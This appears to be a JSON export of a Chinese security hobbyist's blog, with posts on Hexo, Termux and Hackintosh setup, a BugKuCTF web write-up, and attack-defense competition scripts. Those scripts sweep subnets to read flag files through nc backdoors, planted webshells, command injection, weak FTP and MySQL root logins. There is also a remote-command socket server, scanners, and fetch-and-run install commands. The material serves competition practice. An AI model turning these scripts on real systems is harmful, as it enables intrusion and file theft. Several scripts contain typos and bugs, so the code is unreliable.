{"meta":{"title":"Hu5k7's Blog","subtitle":null,"description":null,"author":"Hu5k7","url":"https://hu5k7.github.io","root":"/"},"pages":[{"title":"标签","date":"2019-09-18T01:59:16.900Z","updated":"2019-06-10T01:48:34.720Z","comments":true,"path":"tags/index.html","permalink":"https://hu5k7.github.io/tags/index.html","excerpt":"","text":""},{"title":"关于","date":"2019-09-17T13:26:04.556Z","updated":"2019-07-01T01:30:19.631Z","comments":false,"path":"about/index.html","permalink":"https://hu5k7.github.io/about/index.html","excerpt":"","text":"爱好网络空间安全技术，获得过全国职业技能大赛国二。 小菜鸡一枚，刚踏进网络安全圈子的一小点脚 ​"}],"posts":[{"title":"Hexo插入图片问题的总结","slug":"Hexo插入图片问题的总结","date":"2019-09-18T00:00:00.000Z","updated":"2019-09-18T03:17:43.315Z","comments":true,"path":"2019/09/18/Hexo插入图片问题的总结/","link":"","permalink":"https://hu5k7.github.io/2019/09/18/Hexo插入图片问题的总结/","excerpt":"","text":"经过一天的测试终于找出原因，为什么插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/ 1 问题1 Hexo版本以及插件不是最新 1hexo v 问题2 没有用hexo n &quot;string&quot; 新增文章。 问题3 图片路径的斜杆问题 (/)正斜杆和( \\)反斜杆, 如果图片是直接脱进Makedown，它会写路径的是反斜杆 1![]xx\\xx.png 会让hexo-asset-image插件 自动识别成，加一个名字 正常的：BugKuCTF/xx.png 错误的：BugKuCTF/BugKuCTFxx.png 红色 是错的 蓝色 是对的 问题4 如果在旧版本的Hexo安装过，hexo-asset-image 插件 那就需要重装一遍 12npm remove hexo-asset-imagenpm install hexo-asset-image --save 问题5 这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写 问题6 *最直接最接地气的办法就是去修改插件源代码 * ​ 位置: node_modules\\hexo-asset-image\\index.js tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora 转载请标明出处","categories":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/categories/笔记/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/tags/笔记/"}]},{"title":"Shell脚本","slug":"Shell脚本","date":"2019-09-17T13:39:45.044Z","updated":"2019-06-07T05:52:01.031Z","comments":true,"path":"2019/09/17/Shell脚本/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Shell脚本/","excerpt":"","text":"我全国职业技能大赛比赛时所用的脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=\"192.168.2.\"$ipayload=`echo \"cat /root/flag*.txt;exit\" | nc $ip $port`done 123456webshell:or i in `seq 101 254`;doip=\"192.168.2.\"$icurl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txtdone 1234567ftp:username='admin'passwd='123456'for i in `seq 101 254`;doip=\"192.168.2.\"$ish ftpmain.sh $ip $username $passwd 1234567#配合ftp使用ftpmain:ftp $1 -invuser $2 $3get /root/flag*.txtbye! 有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛 转载请标明出处","categories":[{"name":"Shell脚本","slug":"Shell脚本","permalink":"https://hu5k7.github.io/categories/Shell脚本/"}],"tags":[{"name":"Shell脚本","slug":"Shell脚本","permalink":"https://hu5k7.github.io/tags/Shell脚本/"}]},{"title":"Python脚本:端口扫描","slug":"Python脚本端口扫描(PortScanner)","date":"2019-09-17T13:39:45.043Z","updated":"2019-06-07T05:51:48.110Z","comments":true,"path":"2019/09/17/Python脚本端口扫描(PortScanner)/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本端口扫描(PortScanner)/","excerpt":"","text":"12345678910111213141516171819import socketimport threadingfile=open(\"port.txt\",'w+')def portscan(port): host='192.168.174.1' try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) conn=s.connect_ex((host,port)) if conn ==0: print(\"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;\".format(host,post)) file.write(host+\":\"+str(post)+\"\\n\") else: pass excpet: passfor port in range(1,65535): t=threading.Thread(target=portscan, args=(port, )) t.start() 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"Python脚本:Web_Dirs_Scnnaer","slug":"Python脚本Web_Dirs_Scanner","date":"2019-09-17T13:39:45.042Z","updated":"2019-06-07T05:51:40.595Z","comments":true,"path":"2019/09/17/Python脚本Web_Dirs_Scanner/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本Web_Dirs_Scanner/","excerpt":"","text":"12345678910111213141516171819202122232425262728import requestsimport randomimport reuser_agent_list = [&#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'&#125;,]user_agent = random.choice(user_agent_list)target = input(\"target host &gt;\")dict_path_file = input(\"dicr file &gt;\")def CheckURLProtocol(): Check = re.match(r\"http?://\",target) if Check == None: print(\"[-]Example: http://127.0.0.1 or https://127.0.0.1\") exit(0) else: with open(dict_path_file) as f: for dic in f.readlines(): url = target + str(dic) url = url.replace(\"\\n\",\"\") try: r = requests.get(url,headers=user_agent) if r.status_code == 200: print(r.url) except: pass 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"Python脚本:WebShell_urilb","slug":"Python脚本WebShell_urilb","date":"2019-09-17T13:39:45.041Z","updated":"2019-09-18T01:57:46.584Z","comments":true,"path":"2019/09/17/Python脚本WebShell_urilb/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本WebShell_urilb/","excerpt":"","text":"使用urlilb模块 在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替 1234567891011121314151617import urllib.parseimport urllib.requestimport threadingdef WebShell(i): data = &#123;\"dir\": \"&amp;&amp; type flag.txt\"&#125; url = \"http://192.168.123.\"+str(i)+\"/DirCtrl.php\" data_string=urllib.parse.urlencode(data) new_url=url+\"?\"+data_string try: send = urllib.request.urlopen(new_url,timeout=1) print(send.read().decode(\"utf8\",\"ignore\")) except: passfor i in range(1,255): t = threading.Thread(target=WebShell, args=(i, )) t.start() 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"Python脚本:WebShell","slug":"Python脚本WebShell","date":"2019-09-17T13:39:45.040Z","updated":"2019-06-07T05:51:45.163Z","comments":true,"path":"2019/09/17/Python脚本WebShell/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本WebShell/","excerpt":"","text":"1234567891011121314151617import requestsimport threadingflag = open(\"webshellsave.txt\",\"a\")def run(i): ip=\"192.168.\"+str(i)+\".128\" url=\"http://\"+ip+\"/WebShell.php/\" payload=&#123;'cmd':'cat /root/flag*.txt'&#125; try: r = requests.get(url,payload,timeout=1) flag.write(r.url+\"\\n\"+r.text) print(\"GET FLAG! &gt;&gt;\",r.url,'\\n',r.text) except: print(\"\\nConnect Fail &gt;&gt;\",url)for i in range(101,254): t = threading.Thread(target=run, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"Python脚本:socket_cmd连接","slug":"Python脚本socket_cmd连接","date":"2019-09-17T13:39:45.040Z","updated":"2019-06-17T08:01:23.171Z","comments":true,"path":"2019/09/17/Python脚本socket_cmd连接/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本socket_cmd连接/","excerpt":"","text":"一次性的 Server: 123456789101112131415161718192021import socket,osdef main(): global data, s s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('127.0.0.1',10001)) s.listen(5) print(\"等待连接中……\") while True: conn,addr = s.accept() while True: print('收到命令') data = conn.recv(1024) cmd = os.popen(data.decode()) os_result = cmd.read() conn.sendall(os_result.encode('utf8'))if __name__ == '__main__': main() Client: 1234567891011121314151617import socketServerIP=('127.0.0.1',10001)try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) s.connect(ServerIP) print('[+]连接成功')except: print('[-]服务器无响应') exit(0)while True: data=input('[CMD]&gt;&gt;') s.sendto(bytes(data,encoding='utf8'),ServerIP) data = s.recv(1024) print('[+]回显成功') print(data.decode()) 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"Python脚本:PyMySQL","slug":"Python脚本PyMySQL","date":"2019-09-17T13:39:45.039Z","updated":"2019-06-07T05:58:15.066Z","comments":true,"path":"2019/09/17/Python脚本PyMySQL/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Python脚本PyMySQL/","excerpt":"","text":"这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i): ip='192.168.'+str(i)+'101' username='root' password='root' payload = \"SELECT load_file('C:/flag*.txt')\" try: db = pymysql.connect(ip,username,password,\"mysql\") cursor = db.cursor() cursor.execute(payload) data = cursor.fetchall() print(data) except: passfor i in range(1,249): t = threading.Thread(target=mysql, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]},{"title":"一周8个精选文章:第一章","slug":"Daily01","date":"2019-09-17T13:39:45.037Z","updated":"2019-06-17T01:31:02.253Z","comments":true,"path":"2019/09/17/Daily01/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Daily01/","excerpt":"","text":"从外网到内网的渗透姿势分享 : https://xz.aliyun.com/t/5330 基于EVE-NG平台上构建企业内网攻防环境 : https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA PHP 函数漏洞总结 : https://blog.csdn.net/qq_31481187/article/details/60968595 CTF Training 经典赛题复现环境: https://github.com/CTFTraining/CTFTraining RemTeam攻击技巧和安全防御 : https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/) 盘点那些渗透测试中的奇淫技巧: https://paper.seebug.org/92/ APT34工具 :https://github.com/p3pperp0tts/APT34 CTF线下攻防指南 : http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/ 转载请标明出处","categories":[{"name":"Daily","slug":"Daily","permalink":"https://hu5k7.github.io/categories/Daily/"}],"tags":[{"name":"Daily","slug":"Daily","permalink":"https://hu5k7.github.io/tags/Daily/"}]},{"title":"【BugKuCTF】靶场部分writeup","slug":"BugKuCTF","date":"2019-09-17T13:39:45.036Z","updated":"2019-09-18T03:10:24.286Z","comments":true,"path":"2019/09/17/BugKuCTF/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/BugKuCTF/","excerpt":"","text":"地址:https://ctf.bugku.com/challenges WEB篇[web2]这种类型直接看源码 F12或者Ctrl+U [计算器]——————————————————试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可 计算器1 计算器2 [web基础$_GET]——————————————————不解释，直接看代码 $GET $get1 [web基础$_POST]——————————————————也不解释，直接看代码，需要用到抓包软件 $POST [矛盾]——————————————————先看代码 矛盾 问题出现在 is_numeric 这个函数,is_numeric 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出$num。这个时候我们可以绕过这个函数。 他判断的是数字那么我们给他加点字符串 ?num=1a，则绕过了第一个if判断，并跳到了第二个if判断。 然后他现在直接显示出了flag. 矛盾2 [web3]—————————————————他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。 web3 接着我们直接看源码F12 或者 Ctrl+U，发现最下面有一个被注释的html编码 web3-1 我的方法是，编写到文本，换html格式打开。 web3-2 解码就出来了. [域名解析]————————————————- 域名解析 修改hosts访问 flag.baidu.com即可. hosts位置 windows： C:\\Windows\\System32\\drivers\\etc linux: /etc/hosts [你必须让他停下来]——————————————–打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。 多Go几遍就能看到flag了 停下来 [本地文件包含]————————————————–网站进不去。放弃. [变量1]——————————————————先看审计代码，发现最下面有两个$$args 变量1 $$ 容易引发变量覆盖 思考。我们直接让他全部值显示出来。使用全局变量$GLOBALS 我们直接给他 全局变量$GLOBALS传参进去,args=GLOBALS tips:关于全局变量https://www.runoob.com/php/php-superglobals.html 变量1-2 [web5]—————————————————-输入字符串,啥东西都没有 web5 直接看看源码F12 或者 Ctrl+U web5-1 发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式 tips:原理https://blog.csdn.net/qq_36539075/article/details/79946099 直接F12在Console里粘贴 web5-2 [头等舱]——————————————————什么也没有。 头等舱 在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看 头等舱1 拿到flag！ [网站被黑]——————————————————打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了 webshell1 啥也没提示。直接上御剑扫描找到一个。shell的路径 123.206.87.240:8002/webshell/shell.php webshell2 二话不说直接上爆破Burp Suite webshell3 输入上去 20180813135625263 GET到flag [管理员系统]——————————————————打开发现是一个登入界面。尝试使用SQL万能密码登入 捕获 失败了。IP被禁止访问。 捕获1 于是打开抓包软件在请求头上添加上X-Forwarded-For 127.0.0.1 再试试万能密码 捕获2 密码错误。那么我们来看看源码F12 捕获3 看到源码中有一个被注释的base64的编码。于是解密出来看是test123那么用户名是admin密码是test123 tips:不定时更新。每更新十个题目","categories":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/categories/笔记/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/tags/笔记/"}]},{"title":"【转载】黑苹果安装笔记","slug":"BlackApple","date":"2019-09-17T13:39:45.029Z","updated":"2019-06-07T06:02:41.195Z","comments":true,"path":"2019/09/17/BlackApple/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/BlackApple/","excerpt":"","text":"上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10 我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻 要点: 1、两系统共存则磁盘必须是GPT格式 2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt; 3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt; 4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的） 简略步骤: 远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt; 分区：PE下分一个ESP ，二个NT&lt;br&gt; 安装MAC：u盘安装 安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型 EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了 把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导 在此之前需要的准备： 硬件方面： 一台i7-7700k + Gigabyte Z270X-Gaming5 台式机 最好有一台可用的mac 2个以上空的8G或以上的U盘 软件方面： 准备好mac 10.11.3镜象 准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast 准备好在mac上挂载EFI分区的工具：Clover Configurator BIOS设置： 启动方式：UEFI 硬盘模式：ACHI 家伙事准备得差不多了我们就可以开始了。 一、首先制作mac系统安装盘 1 win系统：在win里下载好mac 10.12系统并安装好transmac 2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘 二、制作win10系统安装盘 三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明 设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成 四、安装完成后，关机，插入 win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。 五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了） 替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。 接下来就是安装各种驱动和完善了参考:https://www.jianshu.com/p/5db38511cc73","categories":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/categories/笔记/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/tags/笔记/"}]},{"title":"Termux安装笔记","slug":"Termux安装","date":"2019-09-17T13:31:59.822Z","updated":"2019-07-16T20:03:35.185Z","comments":true,"path":"2019/09/17/Termux安装/","link":"","permalink":"https://hu5k7.github.io/2019/09/17/Termux安装/","excerpt":"","text":"为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记 科学上网 在Github上搜索ShadowsocksR (https://github.com/shadowsocksr-backup/shadowsocksr-android/releases) 赛风 Termux下载地址 Google商城(要借助科学上网) 酷安 Termux更改源 自动更换指令 1sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list 手动修改 ​ 编辑 $PREFIX/etc/apt/sources.list 修改为如下内容 12# The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main 并更新pkg up / apt update 两种方法安装metasploit 两种方法安装metasploit 第一种 1pkg install metasploit 一路默认安装 第二种 1234apt install wgetwget https://Auxilus.github.io/metasploit.shsh metasploit.shpkg install metasploit 1 Termux安装一些Python必要的库 1pkg install python python-dev python2 python2-dev Termux安装一些常用的辅助工具 1pkg install git curl 美化Termux oh-my-zsh的安装 1sh -c \"$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)\" 一步到位，后面自己选择主题和颜色 Termux安装nmap 1pkg install nmap Termux安装SQLMap 12apt install python2 gitgit clone https://github.com/sqlmapproject/sqlmap 转载请标明出处","categories":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/categories/笔记/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://hu5k7.github.io/tags/笔记/"}]},{"title":"Python脚本:搜索本地NAS","slug":"本地NAS扫描","date":"2019-06-20T00:00:00.000Z","updated":"2019-06-20T01:12:03.518Z","comments":true,"path":"2019/06/20/本地NAS扫描/","link":"","permalink":"https://hu5k7.github.io/2019/06/20/本地NAS扫描/","excerpt":"","text":"12345678910111213141516171819202122import socketimport reimport threadingprint(\"\"\"[搜索本地NAS-Version 0.1]\\n默认扫描最后一个网段1.1.1./24\"\"\")host = input(\"本地IP&gt;\")def searchNAS(i): ip = host+str(i) try: Hostname = socket.gethostbyaddr(ip) match = re.search(r'NAS-SERVER',str(Hostname)).group() if match == \"NAS-SERVER\": print(\"NAS服务器IP地址为 &gt; &#123;&#125;:&#123;&#125;\".format(match,ip)) pass except: passfor i in range(0,256): t = threading.Thread(target=searchNAS,args=(i, )) t.start() 局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器:kissing: 转载请标明出处","categories":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/categories/Python脚本/"}],"tags":[{"name":"Python脚本","slug":"Python脚本","permalink":"https://hu5k7.github.io/tags/Python脚本/"}]}]}